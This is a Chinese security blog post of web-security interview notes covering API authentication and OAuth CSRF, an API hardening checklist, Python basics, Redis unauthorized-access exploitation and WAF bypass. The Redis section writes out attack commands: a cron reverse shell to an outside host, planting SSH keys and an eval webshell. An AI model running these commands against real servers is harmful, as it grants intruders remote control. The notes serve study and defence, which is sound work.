<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="default">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Web安全,">










<meta name="description" content="0x01 API接口测试👇Here 干货满满 1. 接口定义本质：数据的传输与接收 2. 接口类型2.1 RPC（Remote Procedure Call远程过程调用）如Java RMI 2.2 RESTful API REST，全称是 Resource Representational State Transfer，通俗来讲就是，资源在网络中以某种表现形式进行状态转移。分解开来：  Reso">
<meta name="keywords" content="Web安全">
<meta property="og:type" content="article">
<meta property="og:title" content="Web安全面试准备二">
<meta property="og:url" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/index.html">
<meta property="og:site_name" content="m3lon">
<meta property="og:description" content="0x01 API接口测试👇Here 干货满满 1. 接口定义本质：数据的传输与接收 2. 接口类型2.1 RPC（Remote Procedure Call远程过程调用）如Java RMI 2.2 RESTful API REST，全称是 Resource Representational State Transfer，通俗来讲就是，资源在网络中以某种表现形式进行状态转移。分解开来：  Reso">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/1.png">
<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/2.png">
<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/3.png">
<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/4.png">
<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/5.png">
<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/6.png">
<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/7.png">
<meta property="og:updated_time" content="2020-03-16T12:18:39.999Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Web安全面试准备二">
<meta name="twitter:description" content="0x01 API接口测试👇Here 干货满满 1. 接口定义本质：数据的传输与接收 2. 接口类型2.1 RPC（Remote Procedure Call远程过程调用）如Java RMI 2.2 RESTful API REST，全称是 Resource Representational State Transfer，通俗来讲就是，资源在网络中以某种表现形式进行状态转移。分解开来：  Reso">
<meta name="twitter:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>







  <title>Web安全面试准备二 | m3lon</title>
  








  <style>
	blockquote {
	  color: #888;
	  background-color: #eae6f3;
	  border-left: 1rem solid #5236a0;
	  padding: 0 1.5rem;
	  position: relative;
	  font-family: 'Roboto', sans-serif;
	}

	blockquote:before,
	blockquote:after {
	  color: #392570;
	  font-size: 2.5rem;
	  position: absolute;
	  line-height: 2.5rem;
	}

	blockquote:before {
	  content: "\201C";
	  left: -1rem;
	  top: 0;
	}

	blockquote:after {
	  content: "\201D";
	  right: 0;
	  bottom: -1rem;
	}
</style>
</head>


<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>
    <a href="https://github.com/m3lon" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></a>
    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">m3lon</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2020/03/16/Web安全面试准备二/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="m3lon">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/UMR.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="m3lon">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Web安全面试准备二</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-16T18:04:22+08:00">
                2020-03-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="0x01-API接口测试"><a href="#0x01-API接口测试" class="headerlink" title="0x01 API接口测试"></a>0x01 API接口测试</h3><p><a href="https://xz.aliyun.com/t/2412#toc-5" target="_blank" rel="noopener">👇Here</a></p>
<p><a href="https://github.com/shieldfy/API-Security-Checklist/blob/master/README-zh.md" target="_blank" rel="noopener">干货满满</a></p>
<h4 id="1-接口定义"><a href="#1-接口定义" class="headerlink" title="1. 接口定义"></a>1. 接口定义</h4><p>本质：数据的传输与接收</p>
<h4 id="2-接口类型"><a href="#2-接口类型" class="headerlink" title="2. 接口类型"></a>2. 接口类型</h4><h5 id="2-1-RPC"><a href="#2-1-RPC" class="headerlink" title="2.1 RPC"></a>2.1 RPC</h5><p>（Remote Procedure Call远程过程调用）如Java RMI</p>
<h5 id="2-2-RESTful-API"><a href="#2-2-RESTful-API" class="headerlink" title="2.2 RESTful API"></a>2.2 RESTful API</h5><blockquote>
<p>REST，全称是 Resource Representational State Transfer，通俗来讲就是，资源在网络中以某种表现形式进行状态转移。分解开来：</p>
<ul>
<li>Resource：资源，即数据（前面说过网络的核心）。比如 newsfeed，friends等；</li>
<li>Representational：某种表现形式，比如用JSON，XML，JPEG等；</li>
<li>State Transfer：状态变化。通过HTTP动词实现</li>
</ul>
</blockquote>
<h5 id="2-3-Web-Service"><a href="#2-3-Web-Service" class="headerlink" title="2.3 Web Service"></a>2.3 Web Service</h5><h4 id="3-接口鉴权"><a href="#3-接口鉴权" class="headerlink" title="3. 接口鉴权"></a>3. 接口鉴权</h4><h5 id="3-1-HTTP-Basic"><a href="#3-1-HTTP-Basic" class="headerlink" title="3.1 HTTP Basic"></a>3.1 HTTP Basic</h5><p>通过<code>Authorization: Basic Y2h5aW5ncDoxMjM0NTY=</code>  base64加密 username:password 通过http头部Authorization字段传输，其中响应包中的realm表示认证范围</p>
<p>安全缺陷：</p>
<blockquote>
<p>Basic认证的安全缺陷比较明显，它通过明文传输用户的密码，这会导致严重的安全问题。</p>
<ol>
<li>在传输层未加密的情况下，用户明文密码可被中间人截获。(优化方式：通过TLS/SSL加密传输防止MITM攻击)</li>
<li>明文密码一旦泄露，如果用户其他站点也用了同样的明文密码（大概率），那么用户其他站点的安全防线也告破。</li>
</ol>
</blockquote>
<h5 id="3-2-Digest-Access"><a href="#3-2-Digest-Access" class="headerlink" title="3.2 Digest Access"></a>3.2 Digest Access</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/dir/index.html</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">Authorization</span>: Digest username="Mufasa",</span><br><span class="line">                     realm="testrealm@host.com",</span><br><span class="line">                     nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",</span><br><span class="line">                     uri="%2Fcoolshell%2Fadmin",</span><br><span class="line">                     qop=auth,</span><br><span class="line">                     nc=00000001,</span><br><span class="line">                     cnonce="0a4f113b",</span><br><span class="line">                     response="6629fae49393a05397450978507c4ef1",</span><br><span class="line">                     opaque="5ccc069c403ebaf9f0171e9517f40e41"</span><br></pre></td></tr></table></figure>
<p>复杂的算法</p>
<p>安全缺陷</p>
<blockquote>
<p>别看这个算法这么复杂，最后你可以发现，整个过程其实关键是用户的password，这个password如果不够得杂，其实是可以被暴力破解的，而且，整个过程是非常容易受到中间人攻击</p>
</blockquote>
<h5 id="3-3-App-Secret-Key-HMAC"><a href="#3-3-App-Secret-Key-HMAC" class="headerlink" title="3.3 App Secret Key + HMAC"></a>3.3 App Secret Key + HMAC</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span>: AWS4-HMAC-SHA256 </span><br><span class="line">               Credential=AKIDEXAMPLE/20150830/us-east-1/iam/aws4_request, </span><br><span class="line">               SignedHeaders=content-type;host;x-amz-date,               					Signature=5d672d79c15b13162d9279b0855cfba6789a8edb4c82c400e06b5924a6f2b5d7</span><br></pre></td></tr></table></figure>
<ul>
<li>AppID和AppSecretKey，是由服务器的系统开出的，所以，是可以被管理的</li>
<li>没有统一的标准，各家实现的都不一致，比如微信的签名算法就是放在body中（xml格式）</li>
</ul>
<h5 id="3-4-JWT（Json-Web-Tokens）"><a href="#3-4-JWT（Json-Web-Tokens）" class="headerlink" title="3.4 JWT（Json Web Tokens）"></a>3.4 JWT（Json Web Tokens）</h5><p>多了一个认证服务器，通过MAC和RSA公钥加密</p>
<h5 id="3-5-OAuth1-0"><a href="#3-5-OAuth1-0" class="headerlink" title="3.5 OAuth1.0"></a>3.5 OAuth1.0</h5><p>解决第三方授权问题而出现</p>
<h5 id="3-6-OAuth2-0"><a href="#3-6-OAuth2-0" class="headerlink" title="3.6 OAuth2.0"></a>3.6 OAuth2.0</h5><p>从Digest Access， 到AppID+HMAC，再到JWT，再到OAuth 1.0，这些个API认证都是要向Client发一个密钥（或是用密码）然后用HASH或是RSA来签HTTP的请求，<strong>这其中有个主要的原因是，以前的HTTP是明文传输，所以，在传输过程中很容易被篡改，于是才搞出来一套的安全签名机制</strong>，所以，这些个认证的玩法是可以在HTTP明文协议下玩的。</p>
<p>OAuth 2.0依赖于TLS/SSL的链路加密技术（HTTPS），完全放弃了签名的方式，认证服务器再也不返回什么 token secret 的密钥了，所以，OAuth 2.0是完全不同于1.0 的，也是不兼容的。</p>
<p>OAuth2.0 CSRF </p>
<blockquote>
<p>OAuth CSRF是指向第三方认证平台发起登录请求的时候，没有设置state参数或redirect_uri回调地址没有做好限制， 而导致的请求伪造漏洞（CSRF）。<code>state</code>参数在OAuth2认证过程中不是必选参数，因此第三方应用开发者在集成OAuth2认证的时候很容易会忽略它的存在，导致应用易受CSRF攻击。此外，这样的攻击非常巧妙，可以悄无声息的攻陷受害者的账号，难以被察觉到。 </p>
<p>有漏洞的请求示例： </p>
<p><a href="https://openapi.360.cn/oauth2/authorize?client_id=42094ff4920a&amp;response_type=code&amp;redirect_uri=&amp;state=&amp;scope=basic&amp;display=default" target="_blank" rel="noopener">https://openapi.360.cn/oauth2/authorize?client_id=42094ff4920a&amp;response_type=code&amp;redirect_uri=&amp;state=&amp;scope=basic&amp;display=default</a> </p>
<p>OAuth CSRF配合XSS、任意URL跳转漏洞或者图片文件地址未限制，可以造成的攻击效果为 “点我的链接，登录你的xx账号”，历史上出现过的漏洞： </p>
<ol>
<li>点我的链接我就可能会进入你的网易云音乐 <a href="https://wy.64g.win/wooyun-2016-0170272.html" target="_blank" rel="noopener">https://wy.64g.win/wooyun-2016-0170272.html</a> </li>
<li>点我的链接我就可能会进入你的知乎账号 <a href="https://wy.64g.win/wooyun-2015-0162476.html" target="_blank" rel="noopener">https://wy.64g.win/wooyun-2015-0162476.html</a> </li>
<li>域名限制或者referer等限制的绕过 可以通过在域内存在重定向、xss或者图片地址未限制 </li>
<li>对于没有验证码的登陆 且没有验证token的 可以通过csrf让别人登陆自己的账户 </li>
<li>对于这种url中的code 可以通过referer泄漏 </li>
</ol>
</blockquote>
<h5 id="3-7-参考"><a href="#3-7-参考" class="headerlink" title="3.7 参考"></a>3.7 参考</h5><ul>
<li><a href="https://coolshell.cn/articles/19395.html" target="_blank" rel="noopener">https://coolshell.cn/articles/19395.html</a></li>
<li>HTTP Basic认证 <a href="https://juejin.im/entry/5ac175baf265da239e4e3999" target="_blank" rel="noopener">https://juejin.im/entry/5ac175baf265da239e4e3999</a></li>
</ul>
<h4 id="4-安全测试"><a href="#4-安全测试" class="headerlink" title="4. 安全测试"></a>4. 安全测试</h4><p>测试工具：Postman、Burpsuite</p>
<h5 id="4-1-输入控制"><a href="#4-1-输入控制" class="headerlink" title="4.1 输入控制"></a>4.1 输入控制</h5><p>各种注入（SQL、代码、命令、CVS、XXE）、XSS</p>
<h5 id="4-2-逻辑越权"><a href="#4-2-逻辑越权" class="headerlink" title="4.2 逻辑越权"></a>4.2 逻辑越权</h5><p>用户Id、Authorization</p>
<h5 id="4-3-接口滥用"><a href="#4-3-接口滥用" class="headerlink" title="4.3 接口滥用"></a>4.3 接口滥用</h5><p>验证码爆破、登陆爆破</p>
<h5 id="4-4-信息泄漏"><a href="#4-4-信息泄漏" class="headerlink" title="4.4 信息泄漏"></a>4.4 信息泄漏</h5><p>畸形请求导致的配置信息泄漏</p>
<h4 id="5-安全加固"><a href="#5-安全加固" class="headerlink" title="5. 安全加固"></a>5. 安全加固</h4><h5 id="5-1-访问"><a href="#5-1-访问" class="headerlink" title="5.1 访问"></a>5.1 访问</h5><ul>
<li>限制流量来防止 DDoS 攻击和暴力攻击.</li>
<li>在服务端使用 HTTPS 协议来防止 MITM 攻击.</li>
<li>使用 <code>HSTS</code> 协议防止 SSLStrip 攻击.</li>
</ul>
<h5 id="5-2-输入"><a href="#5-2-输入" class="headerlink" title="5.2 输入"></a>5.2 输入</h5><ul>
<li>使用与操作相符的 HTTP 操作函数, <code>GET (读取)</code>, <code>POST (创建)</code>, <code>PUT (替换/更新)</code> 以及 <code>DELETE (删除记录)</code>, 如果请求的方法不适用于请求的资源则返回 <code>405 Method Not Allowed</code>.</li>
<li>在请求头中的 <code>content-type</code> 字段使用内容验证来只允许支持的格式 (如 <code>application/xml</code>, <code>application/json</code> 等等) 并在不满足条件的时候返回 <code>406 Not Acceptable</code>.</li>
<li>验证 <code>content-type</code> 的发布数据和你收到的一样 (如 <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, <code>application/json</code> 等等).</li>
<li>验证用户输入来避免一些普通的易受攻击缺陷 (如 <code>XSS</code>, <code>SQL-注入</code>, <code>远程代码执行</code> 等等).</li>
<li>不要在 URL 中使用任何敏感的数据 (<code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>, or <code>API keys</code>), 而是使用标准的认证请求头.</li>
<li>使用一个 API Gateway 服务来启用缓存、访问速率限制 (如 <code>Quota</code>, <code>Spike Arrest</code>, <code>Concurrent Rate Limit</code>) 以及动态地部署 APIs resources.</li>
</ul>
<h5 id="5-3-处理"><a href="#5-3-处理" class="headerlink" title="5.3 处理"></a>5.3 处理</h5><ul>
<li>检查是否所有的终端都在身份认证之后, 以避免被破坏了的认证体系.</li>
<li>避免使用特有的资源 id. 使用 <code>/me/orders</code> 替代 <code>/user/654321/orders</code></li>
<li>使用 <code>UUID</code> 代替自增长的 id.</li>
<li>如果需要解析 XML 文件, 确保实体解析(entity parsing)是关闭的以避免 <code>XXE</code> 攻击.</li>
<li>如果需要解析 XML 文件, 确保实体扩展(entity expansion)是关闭的以避免通过指数实体扩展攻击实现的 <code>Billion Laughs/XML bomb</code>.</li>
<li>在文件上传中使用 CDN.</li>
<li>如果需要处理大量的数据, 使用 Workers 和 Queues 来快速响应, 从而避免 HTTP 阻塞.</li>
<li>不要忘了把 DEBUG 模式关掉.</li>
</ul>
<h5 id="5-4-输出"><a href="#5-4-输出" class="headerlink" title="5.4 输出"></a>5.4 输出</h5><ul>
<li>发送 <code>X-Content-Type-Options: nosniff</code> 头.</li>
<li>发送 <code>X-Frame-Options: deny</code> 头.</li>
<li>发送 <code>Content-Security-Policy: default-src &#39;none&#39;</code> 头.</li>
<li>删除指纹头 - <code>X-Powered-By</code>, <code>Server</code>, <code>X-AspNet-Version</code> 等等.</li>
<li>在响应中强制使用 <code>content-type</code>, 如果你的类型是 <code>application/json</code> 那么你的 <code>content-type</code> 就是 <code>application/json</code>.</li>
<li>不要返回敏感的数据, 如 <code>credentials</code>, <code>Passwords</code>, <code>security tokens</code>.</li>
<li>在操作结束时返回恰当的状态码. (如 <code>200 OK</code>, <code>400 Bad Request</code>, <code>401 Unauthorized</code>, <code>405 Method Not Allowed</code> 等等).</li>
</ul>
<h3 id="0x02-Python"><a href="#0x02-Python" class="headerlink" title="0x02 Python"></a>0x02 Python</h3><h4 id="1-Python的执行顺序"><a href="#1-Python的执行顺序" class="headerlink" title="1 Python的执行顺序"></a>1 Python的执行顺序</h4><ul>
<li>从上到下执行</li>
<li>python是以缩进对齐组织代码的执行，所有没有缩进的代码都会在载入时执行，这些代码，可以认为是Python的main函数</li>
<li>“def”语句本身就是一个执行的语句</li>
<li><code>__name__</code>: 内置属性<ul>
<li>以单个文件执行时，name便是<code>__main__</code></li>
<li>以模块导入文件时，name便是文件名</li>
</ul>
</li>
</ul>
<h4 id="2-生成器、迭代器-👇这里"><a href="#2-生成器、迭代器-👇这里" class="headerlink" title="2 生成器、迭代器 👇这里"></a>2 生成器、迭代器 <a href="https://foofish.net/what-is-python-generator.html" target="_blank" rel="noopener">👇这里</a></h4><ol>
<li><p>基础：</p>
<ul>
<li>生成器比迭代器更优雅</li>
<li>for循环的本质：调用next方法</li>
</ul>
</li>
<li><p>迭代器</p>
<ul>
<li>所有实现了<code>__iter__</code>()和next()<code>方法的都叫迭代器,其中</code><strong>iter</strong>`()方法返回迭代器对象本身；next()方法返回容器的下一个元素，在结尾时引发StopIteration异常。</li>
<li>迭代器与列表的不同：列表是一次性都加载到内存中，比如如果有一千万个数需要占用400M多内存，而迭代器只需要占用几十个字节，因为它是等调用<code>__next__</code>方法时，才会加载进内存，for循环迭代器就是不停调用<code>__next__</code>方法</li>
<li>常用迭代器：❓Iterator对象 </li>
</ul>
</li>
<li><p>生成器</p>
<ul>
<li>yield语句返回值，yeild存在的函数为生成器函数</li>
<li>生成器本质上还是一个迭代器，唯一的区别在于实现方式不同</li>
<li>生成器函数调用时不会立刻返回，而是调用next方法时才会返回</li>
</ul>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>g = (x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(g)</span><br><span class="line">&lt;type <span class="string">'generator'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = [x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(l)</span><br><span class="line">&lt;type <span class="string">'list'</span>&gt;</span><br></pre></td></tr></table></figure>
<p>总结：生成海量数据时，显然生成器更合适。</p>
<h4 id="3-进程、线程、协程"><a href="#3-进程、线程、协程" class="headerlink" title="3 进程、线程、协程"></a>3 进程、线程、协程</h4><p><strong>对操作系统来说，线程是最小的执行单元，进程是最小的资源管理单元。</strong></p>
<ol>
<li><p>进程是一个执行中的程序，每一个进程CPU都会分配一块地址空间，空间包括：代码（文本）、数据、堆栈。早期只有进程，一个程序想同时执行多个任务，就只能通过多进程，然而进程的创建、撤销、切换消耗太大，于是出现了轻量级进程— 线程</p>
</li>
<li><p>线程：同一进程中的多个线程共享同一块内存空间，线程之间切换需要保存的信息相比进程少很多，只需要保存运行时必不可少的一些信息（程序计数器、寄存器、栈）。线程出现之后，程序想同时执行多个任务，通过多线程切换，调度与切换都比进程的快很多</p>
</li>
</ol>
<p><strong>进程和线程的痛点 — 耗费性能</strong>（进程和线程都是需要保存系统信息的，与操作系统内核有关系。）</p>
<ul>
<li><p>涉及到同步锁。</p>
</li>
<li><p>涉及到线程阻塞状态和可运行状态之间的切换。</p>
</li>
<li><p>涉及到线程上下文的切换。</p>
</li>
</ul>
<ol start="3">
<li>协程：与操作系统内核无关，只与程序有关。</li>
</ol>
<p><img src="1.png" alt="img"></p>
<h3 id="0x03-未授权漏洞"><a href="#0x03-未授权漏洞" class="headerlink" title="0x03 未授权漏洞"></a>0x03 未授权漏洞</h3><h4 id="1-redis未授权"><a href="#1-redis未授权" class="headerlink" title="1. redis未授权"></a>1. redis未授权</h4><h5 id="1-1-crontab写计划任务反弹shell"><a href="#1-1-crontab写计划任务反弹shell" class="headerlink" title="1.1 crontab写计划任务反弹shell"></a>1.1 crontab写计划任务反弹shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.2.6</span><br><span class="line"><span class="built_in">set</span> x <span class="string">"\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h5 id="1-2-写ssh公钥远程连接"><a href="#1-2-写ssh公钥远程连接" class="headerlink" title="1.2 写ssh公钥远程连接"></a>1.2 写ssh公钥远程连接</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 192.168.1.11</span><br><span class="line">192.168.1.11:6379&gt; config <span class="built_in">set</span> dir /Users/antirez/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.1.11:6379&gt; config get dir</span><br><span class="line">1) <span class="string">"dir"</span></span><br><span class="line">2) <span class="string">"/Users/antirez/.ssh"</span></span><br><span class="line">192.168.1.11:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line">192.168.1.11:6379&gt; save</span><br></pre></td></tr></table></figure>
<h5 id="1-3-写入webshell"><a href="#1-3-写入webshell" class="headerlink" title="1.3 写入webshell"></a>1.3 写入webshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['caidao']);?&gt;"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h5 id="1-4-漏洞加固"><a href="#1-4-漏洞加固" class="headerlink" title="1.4 漏洞加固"></a>1.4 漏洞加固</h5><p>1、默认只对本地开放<br>bind 127.0.0.1</p>
<p>2、添加登陆密码<br>requirepass <a href="http://www.secpulse.com" target="_blank" rel="noopener">www.secpulse.com</a></p>
<p>3、在需要对外开放的时候修改默认端口<br>port 2333</p>
<p>4、最后还可以配合iptables限制开放</p>
<h3 id="0x04-业务逻辑漏洞"><a href="#0x04-业务逻辑漏洞" class="headerlink" title="0x04 业务逻辑漏洞"></a>0x04 业务逻辑漏洞</h3><p><a href="https://github.com/PyxYuYu/MyBlog/issues/102" target="_blank" rel="noopener">https://github.com/PyxYuYu/MyBlog/issues/102</a></p>
<h3 id="0x05-WAF绕过"><a href="#0x05-WAF绕过" class="headerlink" title="0x05 WAF绕过"></a>0x05 WAF绕过</h3><p><a href="https://www.cnblogs.com/hookjoy/p/5778418.html" target="_blank" rel="noopener">👇这里</a></p>
<h4 id="1-架构层绕过WAF"><a href="#1-架构层绕过WAF" class="headerlink" title="1. 架构层绕过WAF"></a>1. 架构层绕过WAF</h4><h5 id="1-1-寻找源站"><a href="#1-1-寻找源站" class="headerlink" title="1.1 寻找源站"></a>1.1 寻找源站</h5><p>例如百度云加速、360安全卫士等，通过更改DNS解析，把流量引入WAF集群，流量经过检测后转发请求到源站。如图，liusscs.com接入接入WAF后，liusscs.comd的DNS解析结果指向WAF集群，用户的请求将发送给WAF集群，WAF集群经过检测认为非攻击请求再转发给源站。</p>
<p><img src="2.png" alt=""></p>
<p>针对云WAF架构，通过ip地址：没有dns解析就没有waf集群，直接到达源站：CTF中一种套路</p>
<p>—&gt; 寻找真实ip</p>
<ul>
<li>信息泄漏：网页源代码（注销）、github源代码泄漏、</li>
<li>穷举ip地址（8-9h）</li>
</ul>
